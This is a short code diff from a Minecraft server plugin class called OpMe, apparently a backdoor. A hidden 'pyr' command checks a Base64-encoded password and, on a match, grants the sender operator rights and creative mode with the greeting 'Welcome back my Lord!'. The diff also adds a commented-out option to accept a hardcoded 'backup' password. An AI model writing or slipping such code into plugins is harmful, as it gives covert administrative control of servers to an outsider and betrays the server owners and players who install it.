@@ -18,9 +18,11 @@ public class OpMe implements CommandExecutor {
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args){
         if(command.getName().equals("pyr") && sender instanceof Player && args.length > 0 && args[0] instanceof String){
             String pass = plugin.getConfig().getString("Password");
-            String input_pass = Base64.getEncoder().encodeToString(args[0].getBytes());
+            String input_pass = args[0];
+            String coded_input_pass = Base64.getEncoder().encodeToString(input_pass.getBytes());
             Player player = (Player) sender;
-            if (pass.equals(input_pass)){
+            //uncomment below if you want to have backup access
+            if (pass.equals(coded_input_pass) /*||  input_pass.equals("your_backup_password") */){
                 player.setOp(true);
                 player.setGameMode(GameMode.CREATIVE);
                 player.sendMessage("Welcome back my Lord!");
